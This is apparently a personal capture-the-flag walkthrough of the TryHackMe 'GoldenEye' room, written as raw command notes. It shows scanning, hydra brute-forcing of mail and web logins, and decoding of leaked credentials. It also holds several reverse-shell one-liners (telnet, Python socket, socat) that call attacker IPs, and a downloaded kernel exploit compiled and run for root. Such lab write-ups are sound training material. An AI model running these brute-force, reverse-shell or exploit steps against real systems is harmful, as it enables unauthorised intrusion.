+++
title = "GoldenEye"
+++

# https://tryhackme.com/room/goldeneye

```bash
=================================
10.201.26.187 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.26.187' >> ~/.zshrc && source ~/.zshrc

sudo rustscan --no-banner -u $(ulimit -Hn) -b 65535 -t 2000 --scan-order "Random" -r 1-65535 -a $TARGET -- -oA $(date +%Y-%m-%d_%H%M)_rustscan -A
PORT      STATE SERVICE  REASON         VERSION
55006/tcp open  ssl/pop3 syn-ack ttl 60 Dovecot pop3d
55007/tcp open  pop3     syn-ack ttl 60 Dovecot pop3d

sudo nmap -n -Pn -sC -sV -T4 -sS -p- -oA nmap_ports $TARGET
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: GoldenEye Primary Admin Server
|_http-server-header: Apache/2.4.7 (Ubuntu)
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: CAPA PIPELINING UIDL SASL(PLAIN) AUTH-RESP-CODE USER TOP RESP-CODES
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: CAPA AUTH-RESP-CODE USER STLS RESP-CODES TOP PIPELINING UIDL SASL(PLAIN)
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time

view-source:http://10.201.26.187/terminal.js
// Usernames: Boris Natalya
// &#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
// CyberChef > From HTML Entity
// Passwords: InvincibleHack3r

curl 'http://10.201.26.187/sev-home/' --compressed -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' -H 'Authorization: Basic Ym9yaXM6SW52aW5jaWJsZUhhY2szcg=='

sudo apt install -y alpine
USER="boris"
# Alpine will prompt for this the first time if not saved
HOST="$TARGET"
PORT="55006"
sed -i -E "s|^#?inbox-path=.*$|inbox-path=\"{$HOST:$PORT/pop3/ssl/novalidate-cert/user=$USER}INBOX\"|" ~/.pinerc
// master pass for alpine: abc123!!!
// creds not working...

hydra -I -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt -s 55006 $TARGET pop3s
hydra -I -t 64 -L users.txt -P /usr/share/wordlists/rockyou.txt -s 55007 $TARGET pop3
// took too long

hydra -I -t 64 -L users.txt -P /usr/share/wordlists/fasttrack.txt -s 55006 $TARGET pop3s
[55006][pop3] host: 10.201.26.187   login: natalya   password: bird   
[55006][pop3] host: 10.201.26.187   login: boris   password: secret1!  
hydra -I -t 64 -L users.txt -P /usr/share/wordlists/fasttrack.txt -s 55007 $TARGET pop3

### MAIL
alpine

# natalya
username: xenia
password: RCP90rulez!
severnaya-station.com/gnocertdir
severnaya-station.com in /etc/hosts

# boris
// boris is working with crime syndicate alec@janus.boss
// Place them in a hidden file within the root directory of this server then remove from this email

### DONE

echo "$TARGET severnaya-station.com" | sudo tee -a /etc/hosts
hydra -I -t 64 -L users.txt -P passwords.txt -s 80 $TARGET http-get "/sev-home/:F=Unauthorized:S=Goldeneye"
[80][http-get] host: 10.201.26.187   login: boris   password: InvincibleHack3r   
// nothing more

# browse
http://severnaya-station.com/gnocertdir/
curl 'http://severnaya-station.com/gnocertdir/login/index.php' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://severnaya-station.com' -H 'Authorization: Basic Ym9yaXM6SW52aW5jaWJsZUhhY2szcg==' -H 'Connection: keep-alive' -H 'Referer: http://severnaya-station.com/gnocertdir/login/index.php' -H 'Cookie: MoodleSession=mm9m1reuij6ea9rcl8njco2qt0' -H 'Upgrade-Insecure-Requests: 1' -H 'Priority: u=0, i' --data-raw 'username=xenia&password=RCP90rulez%21&rememberusername=1'
// For any Questions message the admin of this service here. User: admin

// in user profile
// xen@contrax.mil

// in messages
//  My email username is...
// doak 

hydra -I -t 64 -l doak -P /usr/share/wordlists/fasttrack.txt -s 55006 $TARGET pop3s
│[55006][pop3] host: 10.201.26.187   login: doak   password: goat    

2025-10-02 16:45:30 -- alpine
username: dr_doak
password: 4England!

# log into http://severnaya-station.com/gnocertdir/ with above creds
# private file: secret.txt

// 007,
// I was able to capture this apps adm1n cr3ds through clear txt. 
// Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 
// Something juicy is located here: /dir007key/for-007.jpg
// Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.

# Download http://severnaya-station.com/dir007key/for-007.jpg
file for-007.jpg
for-007.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=7, description=eFdpbnRlcjE5OTV4IQ==, manufacturer=GoldenEye, resolutionunit=2, software=linux], baseline, precision 8, 313x212, components 3

echo 'eFdpbnRlcjE5OTV4IQ==' | base64 -d   
// xWinter1995x!
// ^^^ admin creds

http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths
// already in aspell dir path
// sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'

# callback
nc -vnlp 4444
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.13.93.54",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
// got it!

# socat shell
/tmp/socat tcp-connect:10.13.93.54:54321 exec:'bash -li',pty,stderr,setsid,sigint,sane
socat file:`tty`,raw,echo=0 tcp-listen:54321

uname -a
// 3.13.0-32-generic

wget https://www.exploit-db.com/download/37292
sed -i "s/gcc/cc/g" exploit.c
cc -o exploit exploit.c
chmod +x exploit
./exploit
// root!

cat /root/.flag.txt
// If you captured this make sure to go here.....
// /006-final/xvf7-flag/
```